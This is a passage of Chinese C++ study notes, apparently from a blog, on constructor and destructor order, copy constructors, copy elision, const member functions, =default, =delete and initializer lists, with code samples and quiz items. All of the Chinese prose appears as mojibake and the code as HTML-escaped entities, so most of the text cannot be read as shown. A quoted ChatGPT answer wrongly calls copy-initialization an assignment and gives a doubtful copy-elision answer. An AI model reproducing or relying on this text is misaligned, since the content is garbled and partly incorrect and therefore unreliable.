Foo(int x_ = 10, int y_ = 10) { x = x_; y = y_; } }; 2.æ„é€ å‡½æ•°çš„è°ƒç”¨é¡ºåºé—®é¢˜\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; using namespace std; class A{ mutable int a; public: A(){ cout \u0026lt;\u0026lt; \u0026#34;A\u0026#39;s Constructor called \\n\u0026#34;; } ~A(){ cout \u0026lt;\u0026lt; \u0026#34;A\u0026#39;s Destructor called \\n\u0026#34;; } }; class B{ A a; public: B(){ cout \u0026lt;\u0026lt; \u0026#34;B\u0026#39;s Constructor called \\n\u0026#34;; } ~B(){ cout \u0026lt;\u0026lt; \u0026#34;B\u0026#39;s Destructor called \\n\u0026#34;; } }; int main(int argc, char const *argv[]){ B b1; } /* A\u0026#39;s Constructor called B\u0026#39;s Constructor called B\u0026#39;s Destructor called A\u0026#39;s Destructor called */ Bç±»ä¸­å«æœ‰Aç±»ï¼Œå…ˆæŒ‰ç…§Bç±»çš„å‚æ•°å®šä¹‰é¡ºåºæ¥å®šä¹‰æˆå‘˜æ•°æ®ï¼Œå†è°ƒç”¨æ„é€ å‡½æ•°æ¥åˆå§‹åŒ–æˆå‘˜æ•°æ®ï¼Œæ‰€ä»¥å…ˆè°ƒç”¨Açš„æ„é€ å‡½æ•°ï¼Œå†è°ƒç”¨Bçš„æ„é€ å‡½æ•°ã€‚\nææ„å‡½æ•°åˆ™æ˜¯ç”±å¤–åˆ°å†…è°ƒç”¨çš„ã€‚\næˆ–è€…æŒ‰ç…§å®šä¹‰é¡ºåºï¼š\nè®¾å·²ç»æœ‰A,B,C,D4ä¸ªç±»çš„å®šä¹‰ï¼Œç¨‹åºä¸­A,B,C,Dææ„å‡½æ•°è°ƒç”¨é¡ºåºä¸ºï¼Ÿ C c; void main() { A*pa=new A(); B b; static D d; delete pa; } é¦–å…ˆï¼Œç”±äº c æ˜¯ä¸€ä¸ªè‡ªåŠ¨å¯¹è±¡ï¼Œå…¶ææ„å‡½æ•°ä¼šåœ¨å®ƒæ‰€åœ¨çš„ä½œç”¨åŸŸç»“æŸæ—¶è‡ªåŠ¨è°ƒç”¨ã€‚(æ•´ä¸ªç¨‹åºçš„æœ€å) æ¥ä¸‹æ¥ï¼Œç”±äº pa æ˜¯é€šè¿‡ new è¿ç®—ç¬¦åŠ¨æ€åˆ†é…å¾—åˆ°çš„ï¼Œéœ€è¦ä½¿ç”¨ delete è¿ç®—ç¬¦æ‰‹åŠ¨é‡Šæ”¾å†…å­˜ã€‚å› æ­¤ï¼Œåœ¨ delete pa; è¯­å¥æ‰§è¡Œæ—¶ï¼Œä¼šå…ˆè°ƒç”¨ A ç±»çš„ææ„å‡½æ•°ï¼Œå†é‡Šæ”¾å†…å­˜ã€‚ æœ€åï¼Œåœ¨ç¨‹åºç»“æŸæ—¶ï¼Œä¼šå…ˆè°ƒç”¨ B ç±»çš„ææ„å‡½æ•°ï¼Œç„¶åè°ƒç”¨ D ç±»çš„ææ„å‡½æ•°ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼ŒAã€Bã€Cã€D ç±»çš„ææ„å‡½æ•°è°ƒç”¨é¡ºåºä¸ºï¼šA çš„ææ„å‡½æ•° -\u0026gt; B çš„ææ„å‡½æ•° -\u0026gt; D çš„ææ„å‡½æ•° -\u0026gt; c çš„ææ„å‡½æ•° ã€‚\nè¯·æ³¨æ„ï¼Œé™æ€å¯¹è±¡çš„ææ„å‡½æ•°åœ¨ç¨‹åºç»“æŸæ—¶è°ƒç”¨ï¼Œè€Œä¸æ˜¯åœ¨å…¶æ‰€åœ¨çš„å‡½æ•°ç»“æŸæ—¶è°ƒç”¨ã€‚é™æ€å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸä»ç¨‹åºå¼€å§‹åˆ°ç»“æŸï¼Œææ„å‡½æ•°çš„è°ƒç”¨é¡ºåºä¸å®ƒä»¬çš„å®šä¹‰é¡ºåºä¿æŒä¸€è‡´ã€‚\nstaticç±»å¯¹è±¡åªæœ‰å½“mainå‡½æ•°ç»“æŸäº†æ‰ä¼šè°ƒç”¨ææ„å‡½æ•°ã€‚\n\u0026#34;main() terminates\u0026#34; \u0026#34;static class Destructor is executed\u0026#34; æ‹·è´æ„é€ å‡½æ•° # #include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; using namespace std; class A{ mutable int a; public: A(){ cout\u0026lt;\u0026lt;\u0026#34;Default constructor called\\n\u0026#34;; } A(const A\u0026amp; a){ cout\u0026lt;\u0026lt;\u0026#34;Copy Constructor called\\n\u0026#34;; } }; int main(int argc, char const *argv[]) { A obj; A a1 = obj; //ä¹Ÿä¼šç”¨åˆ°æ‹·è´æ„é€ å‡½æ•° A a2(obj); } /* Default constructor called Copy Constructor called Copy Constructor called */ 1.ä¼ é€’ç»™æ‹·è´æ„é€ å‡½æ•°çš„å¯¹è±¡ _______\nA.å¿…é¡»é€šè¿‡å¼•ç”¨ä¼ é€’\nB.å¿…é¡»é€šè¿‡å€¼ä¼ é€’ ï¼ˆAï¼‰\n2.ä¸‹é¢å“ªç§æƒ…å†µä¼šå‘ç”Ÿå¤åˆ¶çœç•¥ï¼Ÿ\nA.å‡½æ•°è¿”å›ä¸€ä¸ªä¸´æ—¶å¯¹è±¡\nB.å‡½æ•°å‚æ•°æ˜¯ä¸€ä¸ªå³å€¼å¼•ç”¨\nC.åˆå§‹åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ä½¿ç”¨åŒç±»å‹çš„å¦ä¸€ä¸ªå¯¹è±¡\nD.ä¸Šè¿°éƒ½æ˜¯ï¼ˆDï¼‰\nå¤åˆ¶çœç•¥ï¼ˆcopy elisionï¼‰æ˜¯ç¼–è¯‘å™¨çš„ä¸€ç§ä¼˜åŒ–æŠ€æœ¯ï¼Œåœ¨ç‰¹å®šæƒ…å†µä¸‹å¯ä»¥é¿å…å¯¹è±¡çš„æ‹·è´æˆ–ç§»åŠ¨æ“ä½œï¼Œä»è€Œæé«˜ç¨‹åºçš„æ€§èƒ½å’Œæ•ˆç‡ã€‚ä»¥ä¸‹æ˜¯å‡ ç§æƒ…å†µå¯èƒ½ä¼šè§¦å‘å¤åˆ¶çœç•¥ï¼š\rè¿”å›å€¼ä¼˜åŒ–ï¼ˆRVOï¼‰ï¼š\rå½“å‡½æ•°è¿”å›ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå¦‚æœè¢«è¿”å›çš„å¯¹è±¡æ˜¯ä¸€ä¸ªå±€éƒ¨å¯¹è±¡ï¼Œä¸”è¯¥å¯¹è±¡æ²¡æœ‰è¢«å…¶ä»–ä»£ç å¼•ç”¨ï¼Œç¼–è¯‘å™¨å¯ä»¥å°†è¿™ä¸ªå±€éƒ¨å¯¹è±¡ç›´æ¥æ„é€ åœ¨è°ƒç”¨è€…æä¾›çš„å­˜å‚¨ç©ºé—´ä¸­ï¼Œè€Œä¸è¿›è¡Œå®é™…çš„æ‹·è´æˆ–ç§»åŠ¨æ“ä½œã€‚\rå‘½åè¿”å›å€¼ä¼˜åŒ–ï¼ˆNRVOï¼‰ï¼š\rç±»ä¼¼äºè¿”å›å€¼ä¼˜åŒ–ï¼Œå½“å‡½æ•°è¿”å›ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå¦‚æœè¢«è¿”å›çš„å¯¹è±¡æ˜¯ä¸€ä¸ªå±€éƒ¨å¯¹è±¡ï¼Œå¹¶ä¸”è¯¥å¯¹è±¡åœ¨å‡½æ•°å†…éƒ¨è¢«å‘½åå¹¶å£°æ˜ä¸ºå‡½æ•°è¿”å›å€¼ï¼Œç¼–è¯‘å™¨å¯ä»¥ç›´æ¥å°†è¿™ä¸ªå±€éƒ¨å¯¹è±¡æ„é€ åœ¨å‡½æ•°å¤–éƒ¨çš„ç›®æ ‡å¯¹è±¡ä¸­ï¼Œè€Œä¸è¿›è¡Œå®é™…çš„æ‹·è´æˆ–ç§»åŠ¨æ“ä½œã€‚\rå‚æ•°ä¼ é€’ä¼˜åŒ–ï¼š\rå½“å°†ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°å‚æ•°è¿›è¡Œä¼ é€’æ—¶ï¼Œå¦‚æœä¼ é€’çš„å¯¹è±¡æ˜¯ä¸€ä¸ªä¸´æ—¶å¯¹è±¡ï¼Œå¹¶ä¸”è¯¥ä¸´æ—¶å¯¹è±¡æ²¡æœ‰è¢«å…¶ä»–ä»£ç å¼•ç”¨ï¼Œç¼–è¯‘å™¨å¯ä»¥ç›´æ¥å°†è¿™ä¸ªä¸´æ—¶å¯¹è±¡æ„é€ åœ¨å‡½æ•°å†…éƒ¨çš„ç›®æ ‡å¯¹è±¡ä¸­ï¼Œè€Œä¸è¿›è¡Œå®é™…çš„æ‹·è´æˆ–ç§»åŠ¨æ“ä½œã€‚ 3.ä¸‹é¢å“ªç§å†™æ³•å¯ä»¥åˆ©ç”¨å¤åˆ¶çœç•¥æé«˜æ€§èƒ½ï¼Ÿ\nA.std::string s = \u0026quot;hello\u0026quot;; B.std::string s(\u0026quot;hello\u0026quot;); C.std::string s = std::string(\u0026quot;hello\u0026quot;); D.ä¸Šè¿°éƒ½æ˜¯ ï¼ˆBï¼‰\nChatGPT:\nåœ¨ä¸Šè¿°é€‰é¡¹ä¸­ï¼Œé€‰é¡¹ B å¯ä»¥åˆ©ç”¨å¤åˆ¶çœç•¥ï¼ˆcopy elisionï¼‰æé«˜æ€§èƒ½ã€‚\nå¤åˆ¶çœç•¥æ˜¯ä¸€ç§ç¼–è¯‘å™¨çš„ä¼˜åŒ–æŠ€æœ¯ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯ä»¥é¿å…ä¸å¿…è¦çš„å¯¹è±¡æ‹·è´æˆ–ç§»åŠ¨æ“ä½œï¼Œä»è€Œæé«˜ç¨‹åºçš„æ€§èƒ½å’Œæ•ˆç‡ã€‚\nåœ¨é€‰é¡¹ B ä¸­ï¼Œä½¿ç”¨ç›´æ¥åˆå§‹åŒ–è¯­æ³•åˆ›å»º std::string å¯¹è±¡ sï¼Œå¹¶å°† \u0026ldquo;hello\u0026rdquo; ä½œä¸ºå‚æ•°ä¼ é€’ç»™æ„é€ å‡½æ•°ã€‚ç”±äºè¿™é‡Œåªæ¶‰åŠä¸€æ¬¡å¯¹è±¡çš„ç›´æ¥åˆå§‹åŒ–ï¼Œç¼–è¯‘å™¨å¯ä»¥é€šè¿‡å¤åˆ¶çœç•¥æ¥é¿å…é¢å¤–çš„æ‹·è´æ“ä½œã€‚\nåœ¨å…¶ä»–ä¸¤ä¸ªé€‰é¡¹ä¸­ï¼Œéƒ½ä½¿ç”¨äº†èµ‹å€¼æ“ä½œç¬¦ï¼Œä¼šå¯¼è‡´åˆå§‹åŒ–è¿‡ç¨‹ä¸­å‘ç”Ÿä¸€æ¬¡æ‹·è´æ“ä½œã€‚å°½ç®¡ç°ä»£ç¼–è¯‘å™¨é€šå¸¸å¯ä»¥è¿›è¡Œ RVOï¼ˆè¿”å›å€¼ä¼˜åŒ–ï¼‰æˆ– NRVOï¼ˆå‘½åè¿”å›å€¼ä¼˜åŒ–ï¼‰ç­‰ä¼˜åŒ–æ¥å‡å°‘å¯¹è±¡æ‹·è´çš„å¼€é”€ï¼Œä½†ä»ç„¶ä¸å¦‚ç›´æ¥åˆå§‹åŒ–è¯­æ³•åœ¨æ€§èƒ½ä¸Šé«˜æ•ˆã€‚\nå› æ­¤ï¼Œåœ¨è¿™ä¸ªç‰¹å®šçš„æƒ…å†µä¸‹ï¼Œé€‰é¡¹ B çš„å†™æ³•å¯ä»¥é€šè¿‡å¤åˆ¶çœç•¥æé«˜æ€§èƒ½ã€‚\nconst # 1.constç±»å‹çš„å¯¹è±¡åªèƒ½è°ƒç”¨constæˆå‘˜å‡½æ•°\n2.å¼€å‘è€…ä¸å¯ä»¥å°†æ„é€ å‡½æ•°è®¾ç½®constæˆå‘˜å‡½æ•°\n3.å½“ä¸€ä¸ªå¯¹è±¡æŒ‰å€¼ä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œå‡½æ•°ä¼šåœ¨æ ˆä¸Šåˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œå¹¶å°†åŸå§‹å¯¹è±¡çš„å€¼å¤åˆ¶åˆ°è¿™ä¸ªæ–°å¯¹è±¡ä¸­ã€‚å‡½æ•°åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¯¹è¯¥å‰¯æœ¬è¿›è¡Œæ“ä½œï¼Œè€Œä¸ä¼šå½±å“åŸå§‹å¯¹è±¡ã€‚\n4.å®šä¹‰constå¯¹è±¡\nåœ¨ C++ ä¸­ï¼Œconst ä¹Ÿå¯ä»¥ç”¨æ¥ä¿®é¥°å¯¹è±¡ï¼Œç§°ä¸ºå¸¸å¯¹è±¡ã€‚ä¸€æ—¦å°†å¯¹è±¡å®šä¹‰ä¸ºå¸¸å¯¹è±¡ä¹‹åï¼Œå°±åªèƒ½è°ƒç”¨ç±»çš„ const æˆå‘˜ï¼ˆåŒ…æ‹¬ const æˆå‘˜å˜é‡å’Œ const æˆå‘˜å‡½æ•°ï¼‰äº†ã€‚\rå®šä¹‰å¸¸å¯¹è±¡çš„è¯­æ³•å’Œå®šä¹‰å¸¸é‡çš„è¯­æ³•ç±»ä¼¼ï¼š\rconst class object(params);\rclass const object(params);\rå½“ç„¶ä½ ä¹Ÿå¯ä»¥å®šä¹‰ const æŒ‡é’ˆï¼š\rconst class *p = new class(params);\rclass const *p = new class(params);\rclassä¸ºç±»åï¼Œobjectä¸ºå¯¹è±¡åï¼Œparamsä¸ºå®å‚åˆ—è¡¨ï¼Œpä¸ºæŒ‡é’ˆåã€‚ä¸¤ç§æ–¹å¼å®šä¹‰å‡ºæ¥çš„å¯¹è±¡éƒ½æ˜¯å¸¸å¯¹è±¡ã€‚ 5.\nconstæˆå‘˜å‡½æ•°æ˜¯æŒ‡åœ¨C++ä¸­ï¼Œè¢«å£°æ˜ä¸ºconstçš„æˆå‘˜å‡½æ•°ã€‚constæˆå‘˜å‡½æ•°åœ¨ç±»å†…éƒ¨æˆ–ç±»å¤–éƒ¨å®šä¹‰æ—¶ä½¿ç”¨constå…³é”®å­—è¿›è¡Œæ ‡è¯†ï¼Œå¹¶ä¸”åœ¨å‡½æ•°ç­¾åçš„æœ«å°¾åŠ ä¸Šconstä¿®é¥°ç¬¦ã€‚\rconstæˆå‘˜å‡½æ•°æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š\rä¸ä¿®æ”¹å¯¹è±¡çŠ¶æ€ï¼šconstæˆå‘˜å‡½æ•°æ‰¿è¯ºä¸ä¼šä¿®æ”¹ç±»çš„æ•°æ®æˆå‘˜ã€‚å®ƒä»¬å¯ä»¥è¯»å–å¯¹è±¡çš„æ•°æ®æˆå‘˜å’Œè°ƒç”¨å…¶ä»–constæˆå‘˜å‡½æ•°ï¼Œä½†ä¸èƒ½ä¿®æ”¹å¯¹è±¡çš„ä»»ä½•émutableæˆå‘˜ã€‚\rä¿æŠ¤å¯¹è±¡çš„å¸¸é‡æ€§ï¼šconstæˆå‘˜å‡½æ•°åœ¨è¢«è°ƒç”¨æ—¶ï¼Œå¦‚æœå¯¹è±¡ä¸ºconstæˆ–é€šè¿‡constå¼•ç”¨æˆ–æŒ‡é’ˆè°ƒç”¨ï¼Œåˆ™åªèƒ½è°ƒç”¨constæˆå‘˜å‡½æ•°ã€‚\ræˆå‘˜å‡½æ•°é‡è½½ï¼šåŒåçš„éconstæˆå‘˜å‡½æ•°å’Œconstæˆå‘˜å‡½æ•°å¯ä»¥å…±å­˜ï¼Œå¹¶æ ¹æ®è°ƒç”¨å¯¹è±¡çš„å¸¸é‡æ€§æ¥ç¡®å®šå…·ä½“è°ƒç”¨å“ªä¸ªå‡½æ•°ã€‚\rå¸¸é‡å¯¹è±¡è°ƒç”¨ï¼šå½“ä½¿ç”¨å¸¸é‡å¯¹è±¡è°ƒç”¨æˆå‘˜å‡½æ•°æ—¶ï¼Œåªèƒ½è°ƒç”¨constæˆå‘˜å‡½æ•°ã€‚è¿™æ ·å¯ä»¥ç¡®ä¿å¸¸é‡å¯¹è±¡çš„çŠ¶æ€ä¸ä¼šè¢«ä¿®æ”¹ã€‚\ré€šè¿‡åœ¨æˆå‘˜å‡½æ•°çš„å£°æ˜å’Œå®šä¹‰ä¸­æ·»åŠ constå…³é”®å­—ï¼Œå¯ä»¥å°†å…¶é™„åŠ çš„å¸¸é‡å±æ€§è¡¨è¾¾å‡ºæ¥ï¼Œåœ¨ç¼–è¯‘å™¨å±‚é¢è¿›è¡Œç±»å‹æ£€æŸ¥å’Œé™åˆ¶ï¼Œæä¾›æ›´å®‰å…¨å’Œå¯é çš„ä»£ç ç¼–å†™æ–¹å¼ã€‚ 6.åŒä¸€ä¸ªç¨‹åºä¸­çš„ä¸€ä¸ªå‡½æ•°å¯ä»¥åŒæ—¶æœ‰constå’Œnon-constä¸¤ä¸ªç‰ˆæœ¬ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œè¿™ä¸¤ä¸ªç‰ˆæœ¬è¢«è§†ä¸ºå‡½æ•°é‡è½½ï¼Œæ ¹æ®è°ƒç”¨æ—¶çš„å¯¹è±¡æ˜¯å¦ä¸ºconstå¯¹è±¡æ¥é€‰æ‹©åˆé€‚çš„ç‰ˆæœ¬è¿›è¡Œè°ƒç”¨ã€‚\nè€ƒè™‘ä»¥ä¸‹ç¤ºä¾‹ï¼š\nclass MyClass {\rpublic:\rvoid function() {\r// éå¸¸è§„èŒƒçš„å‡½æ•°å®ç°\r}\rvoid function() const {\r// å¸¸è§„èŒƒçš„å‡½æ•°å®ç°\r}\r}; ä¸Šè¿°ä»£ç å®šä¹‰äº†ä¸€ä¸ªåä¸ºfunctionçš„æˆå‘˜å‡½æ•°ï¼Œå¹¶åˆ†åˆ«æä¾›äº†ä¸€ä¸ªéconstç‰ˆæœ¬å’Œä¸€ä¸ªconstç‰ˆæœ¬ã€‚éconstç‰ˆæœ¬ç”¨äºå¯¹éconstå¯¹è±¡è¿›è¡Œæ“ä½œï¼Œè€Œconstç‰ˆæœ¬ç”¨äºå¯¹constå¯¹è±¡è¿›è¡Œæ“ä½œã€‚\nå½“éconstå¯¹è±¡è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œå°†ä¼šè°ƒç”¨éconstç‰ˆæœ¬çš„å‡½æ•°ï¼›å½“constå¯¹è±¡è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œå°†ä¼šè°ƒç”¨constç‰ˆæœ¬çš„å‡½æ•°ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥å®ç°å¯¹ä¸åŒç±»å‹ï¼ˆconstå’Œéconstï¼‰çš„å¯¹è±¡è¿›è¡Œç‰¹å®šçš„æ“ä½œï¼Œå¹¶ä¿è¯ä¸æ”¹å˜constå¯¹è±¡çš„çŠ¶æ€ã€‚\nä½¿ç”¨constå’Œéconstç‰ˆæœ¬çš„å‡½æ•°é‡è½½ï¼Œå¯ä»¥æé«˜ç¨‹åºçš„çµæ´»æ€§å’Œå¯è¯»æ€§ï¼Œåœ¨ä¸æ”¹å˜å¯¹è±¡çŠ¶æ€çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å¯¹constå¯¹è±¡è¿›è¡Œæ“ä½œï¼Œé¿å…æ„å¤–ä¿®æ”¹å¯¹è±¡çš„è¡Œä¸ºã€‚\n7.å¦‚æœåœ¨ä¸€ä¸ªç±»ä¸­å£°æ˜ä»¥ä¸‹4ä¸ªé‡è½½å‡½æ•°ï¼Œæœ‰å“ªä¸¤ä¸ªæ˜¯äº’ç›¸å†²çªçš„ï¼Ÿ\nPoint fun1(); // 1 const Point fun1(); // 2 Point fun1() const; // 3 const Point fun1() const; // 4 ï¼ˆ1ä¸2å†²çªï¼Œ3ä¸4å†²çªï¼‰\nè¿™æ˜¯å› ä¸ºå‡½æ•°é‡è½½éœ€è¦æ ¹æ®å‡½æ•°çš„å‚æ•°åˆ—è¡¨å’Œå‡½æ•°çš„é¡¶å±‚ constï¼ˆå¯¹äºéæˆå‘˜å‡½æ•°è€Œè¨€ï¼‰æ¥è¿›è¡ŒåŒºåˆ†ï¼Œä½†ä¸è€ƒè™‘å‡½æ•°çš„è¿”å›ç±»å‹ã€‚åªæœ‰å‡½æ•°çš„è¿”å›ç±»å‹ä¸åŒæ—¶ï¼Œå®ƒä»¬ä¼šè¢«è§†ä¸ºç›¸åŒçš„å‡½æ•°ï¼Œäº§ç”Ÿå†²çªã€‚æ‰€ä»¥1ä¸2ç›¸å†²çªã€‚\nç±»ä¸­å­˜åœ¨åç½®constçš„å¸¸å‡½æ•°ï¼Œä¸æ™®é€šç±»æˆå‘˜å‡½æ•°ä¹‹é—´å¯ä»¥å®ç°é‡è½½ã€‚\næ³¨ï¼šåç½®constä½œç”¨åœ¨ä¸thisæŒ‡é’ˆä¸Šï¼Œä½¿å…¶åŸæœ¬çš„ type * const this æŒ‡é’ˆè½¬å˜ä¸º const type * const thisæŒ‡é’ˆï¼Œå› æ­¤åœ¨å£°æ˜ä¸ºåç½®constçš„å¸¸å¯¹è±¡ä¸­ä¸å¯ä¿®æ”¹ç±»æˆå‘˜å˜é‡ï¼ˆmutableä¸const_casté™¤å¤–ï¼‰ã€‚ //å‰ç½®åªå½±å“è¿”å›å€¼ï¼ï¼ï¼ default # class B { public: int func() = default; // 1 B(int, int) = default; // 2 B(int = 0) = default; // 3 };//1 2 3 éƒ½ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ // non-special member functions can\u0026#39;t be defaulted(éç‰¹æ®Šæˆå‘˜å‡½æ•°ä¸èƒ½ä½¿ç”¨default) class B { public: // Error, func is not a special member function. int func() = default; // Error, constructor B(int, int) is not a special member function. B(int, int) = default; // Error, constructor B(int=0) has a default argument. B(int = 0) = default; }; int main() { return 0; } delete # ç¦ç”¨æˆå‘˜å‡½æ•°çš„ä½¿ç”¨ã€‚è¿™æ˜¯é€šè¿‡é™„åŠ = deleteè¯´æ˜ç¬¦åˆ°è¯¥å‡½æ•°å£°æ˜çš„ç»“å°¾æ¥å®Œæˆçš„ã€‚åˆ é™¤çš„å‡½æ•°æ˜¯éšå¼å†…è”çš„ï¼Œåˆ é™¤çš„å‡½æ•°å®šä¹‰å¿…é¡»æ˜¯å‡½æ•°çš„ç¬¬ä¸€ä¸ªå£°æ˜ã€‚\nå¿…é¡»åœ¨å‡½æ•°ç¬¬ä¸€æ¬¡å£°æ˜çš„æ—¶å€™å°†å…¶å£°æ˜ä¸º deleted å‡½æ•°ï¼ï¼ï¼\nclass C { public: C(); }; C::C() = delete; explicitly deleted\nç¦ç”¨æ‹·è´æ„é€ å‡½æ•°ï¼š\nclass A { public: A(int x): m(x) { } // Delete the copy constructor A(const A\u0026amp;) = delete; // Delete the copy assignment operator A\u0026amp; operator=(const A\u0026amp;) = delete; int m; }; ç¦ç”¨ä¸éœ€è¦çš„å‚æ•°è½¬æ¢:\nclass A { public: A(int) {} // Declare the conversion constructor as a deleted function. Without this step, // even though A(double) isn\u0026#39;t defined, the A(int) would accept any double value // for it\u0026#39;s argumentand convert it to an int A(double) = delete; }; åˆå§‹åŒ–æˆå‘˜åˆ—è¡¨ # æˆå‘˜æ˜¯æŒ‰ç…§ä»–ä»¬åœ¨ç±»ä¸­å‡ºç°çš„é¡ºåºè¿›è¡Œåˆå§‹åŒ–çš„ï¼Œè€Œä¸æ˜¯æŒ‰ç…§ä»–ä»¬åœ¨åˆå§‹åŒ–åˆ—è¡¨å‡ºç°çš„é¡ºåºåˆå§‹åŒ–çš„ï¼Œçœ‹ä»£ç ã€‚\nclass foo{ int i ; int j ; foo(int x):j(x), i(j){} // iå€¼æœªå®šä¹‰ }; ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨é™¤äº†å¯ä»¥æå‡ç¨‹åºæ€§èƒ½å¤–ï¼Œè¿˜å¯ä»¥å®Œæˆä¸€äº›ä½¿ç”¨å¸¸è§„æ„é€ å‡½æ•°æ— æ³•å®Œæˆçš„åŠŸèƒ½ã€‚\né€šè¿‡åˆå§‹åŒ–åˆ—è¡¨ï¼Œå¯ä»¥åœ¨å¯¹è±¡çš„æ„é€ è¿‡ç¨‹ä¸­ç›´æ¥å¯¹æˆå‘˜å˜é‡è¿›è¡Œåˆå§‹åŒ–ã€‚è¿™ç§æ–¹å¼å¯ä»¥é¿å…åœ¨æ„é€ å‡½æ•°ä½“å†…å…ˆæ‰§è¡Œé»˜è®¤åˆå§‹åŒ–ï¼Œç„¶åå†èµ‹å€¼çš„æ“ä½œï¼Œæé«˜äº†æ•ˆç‡ã€‚\næ­¤å¤–ï¼Œä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨è¿˜å¯ä»¥å®Œæˆä»¥ä¸‹åŠŸèƒ½ï¼š\nåˆå§‹åŒ–å¸¸é‡æˆå‘˜å˜é‡ï¼šç±»ä¸­çš„å¸¸é‡æˆå‘˜å˜é‡å¿…é¡»åœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­è¿›è¡Œåˆå§‹åŒ–ï¼Œå› ä¸ºå®ƒä»¬ä¸èƒ½é€šè¿‡èµ‹å€¼è¯­å¥æ¥ä¿®æ”¹ã€‚ åˆå§‹åŒ–å¼•ç”¨æˆå‘˜å˜é‡ï¼šå¼•ç”¨æˆå‘˜å˜é‡å¿…é¡»åœ¨å¯¹è±¡æ„é€ æ—¶è¿›è¡Œåˆå§‹åŒ–ï¼Œå¹¶ä¸”æ— æ³•åœ¨æ„é€ å‡½æ•°ä½“å†…ä¿®æ”¹å¼•ç”¨ç›®æ ‡ã€‚å› æ­¤ï¼Œåªèƒ½åœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­å¯¹å¼•ç”¨æˆå‘˜å˜é‡è¿›è¡Œåˆå§‹åŒ–ã€‚ è°ƒç”¨åŸºç±»çš„æ„é€ å‡½æ•°ï¼šæ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°åœ¨è°ƒç”¨ä¹‹å‰ä¼šè‡ªåŠ¨è°ƒç”¨åŸºç±»çš„æ„é€ å‡½æ•°ã€‚é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨ï¼Œå¯ä»¥æ˜ç¡®æŒ‡å®šè¦è°ƒç”¨çš„åŸºç±»æ„é€ å‡½æ•°ä»¥åŠä¼ é€’ç»™åŸºç±»æ„é€ å‡½æ•°çš„å‚æ•°ã€‚ å¯¹è±¡æˆå‘˜å˜é‡çš„åˆå§‹åŒ–ï¼šåœ¨ç±»ä¸­åŒ…å«å…¶ä»–ç±»å¯¹è±¡ä½œä¸ºæˆå‘˜å˜é‡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨æ¥åˆå§‹åŒ–è¿™äº›æˆå‘˜å¯¹è±¡ã€‚ æ€»è€Œè¨€ä¹‹ï¼Œåˆå§‹åŒ–åˆ—è¡¨ä¸ä»…å¯ä»¥æå‡ç¨‹åºæ€§èƒ½ï¼Œè¿˜å¯ä»¥åœ¨æ„é€ å¯¹è±¡æ—¶å®ç°ç‰¹å®šçš„åˆå§‹åŒ–éœ€æ±‚ï¼Œå¦‚åˆå§‹åŒ–å¸¸é‡æˆ–å¼•ç”¨æˆå‘˜å˜é‡ã€è°ƒç”¨åŸºç±»æ„é€ å‡½æ•°ç­‰ã€‚\nclass Test { public: int first; int second; Test(int value): second(value), first(second) {} }; int main() { Test t(1); cout \u0026lt;\u0026lt; t.first \u0026lt;\u0026lt; endl; return 0; } ä½†æ˜¯ï¼Œåœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­ï¼Œsecond åäº first è¿›è¡Œåˆå§‹åŒ–ï¼Œå¯¼è‡´ first ä½¿ç”¨äº†æœªè¢«åˆå§‹åŒ–çš„ second çš„å€¼ï¼Œä»è€Œå¼•å‘æœªå®šä¹‰è¡Œä¸ºã€‚\n1.æˆå‘˜å˜é‡åœ¨ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨åˆå§‹åŒ–æ—¶ï¼Œä¸æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–æˆå‘˜åˆ—è¡¨çš„é¡ºåºæ— å…³ï¼Œåªä¸å®šä¹‰æˆå‘˜å˜é‡çš„é¡ºåºæœ‰å…³\n2.å¦‚æœä¸ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨åˆå§‹åŒ–ï¼Œåœ¨æ„é€ å‡½æ•°å†…åˆå§‹åŒ–æ—¶ï¼Œæ­¤æ—¶ä¸æˆå‘˜å˜é‡åœ¨æ„é€ å‡½æ•°ä¸­çš„ä½ç½®æœ‰å…³ã€‚\n3.ï¼ˆæ„é€ å‡½æ•°è°ƒç”¨é¡ºåºï¼šï¼‰\nBä¸­æœ‰ç±»Aæˆå‘˜å˜é‡ï¼š\nAæ„é€ è°ƒç”¨ - Bæ„é€ è°ƒç”¨ - Bææ„è°ƒç”¨ - Aææ„è°ƒç”¨\n4.å˜é‡çš„åˆå§‹åŒ–é¡ºåºå°±åº”è¯¥æ˜¯ï¼š\n1 åŸºç±»çš„é™æ€å˜é‡æˆ–å…¨å±€å˜é‡\n2 æ´¾ç”Ÿç±»çš„é™æ€å˜é‡æˆ–å…¨å±€å˜é‡\n3 åŸºç±»çš„æˆå‘˜å˜é‡\n4 æ´¾ç”Ÿç±»çš„æˆå‘˜å˜é‡\né‡è½½ # 1.æ— æ³•è¢«é‡è½½çš„è¿ç®—ç¬¦ # åœ¨C++ä¸­ï¼Œæœ‰ä¸€äº›è¿ç®—ç¬¦æ˜¯æ— 